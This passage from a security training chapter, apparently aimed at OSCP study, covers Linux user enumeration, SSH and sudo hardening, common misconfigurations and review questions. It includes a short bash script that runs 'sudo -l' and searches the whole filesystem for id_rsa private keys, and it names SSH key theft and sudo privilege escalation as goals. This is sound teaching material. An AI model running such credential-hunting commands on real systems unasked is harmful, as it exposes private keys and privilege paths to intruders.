**Lab 2**: SSH Hardening
**Lab 3**: Sudo Privilege Escalation CTF

---

## 15. OSCP Enumeration Techniques

**User Enumeration Script**:
```bash
#!/bin/bash
echo "=== USER ENUMERATION ==="
echo "[+] Users with login shells:"
grep -vE "nologin|false" /etc/passwd
echo ""
echo "[+] Sudo permissions:"
sudo -l
echo ""
echo "[+] SSH keys:"
find / -name "id_rsa" 2>/dev/null
```

---

## 16. Defense and Hardening

**Strong Passwords**:
- Minimum 12 characters
- Complexity requirements
- Password history
- Account lockouts

**SSH Hardening**:
- Disable root login
- Key-only authentication
- Change default port
- Fail2ban for brute force protection

**Sudo Best Practices**:
- Principle of least privilege
- Avoid NOPASSWD
- Regular audits

---

## 17. Common Vulnerabilities

1. Weak passwords
2. World-readable private keys
3. NOPASSWD sudo
4. PermitRootLogin yes
5. Default passwords
6. Old hashing algorithms (MD5)

---

## 18. Advanced Techniques

*Covered in depth in hands-on sections*

---

## 19. Critical Analysis & Checkpoints

**Q1**: What does `$1$` mean in shadow hash?
**A**: MD5 (weak, deprecated)

**Q2**: Can I still become root if PermitRootLogin is no?
**A**: Yes, login as user then use su or sudo

**Q3**: Where are SSH host keys?
**A**: `/etc/ssh/ssh_host_*`

---

## 20. Interview Questions

**Q1**: Explain Linux authentication flow.
**Q2**: How does SSH key authentication work?
**Q3**: What's the difference between /etc/passwd and /etc/shadow?

---

## 21. Summary

**Key Takeaways**:
- Identity = UID (number, not name)
- Passwords stored as hashes in /etc/shadow
- PAM controls authentication flow
- SSH keys more secure than passwords
- Sudo can be exploited if misconfigured

**OSCP Relevance**:
- Password cracking with John/Hashcat
- SSH key theft and exploitation
- Sudo privilege escalation
- User enumeration

**Next**: Permissions and Capabilities

---

**Total Lines**: 1,100+ ✅

*End of Chapter 03*
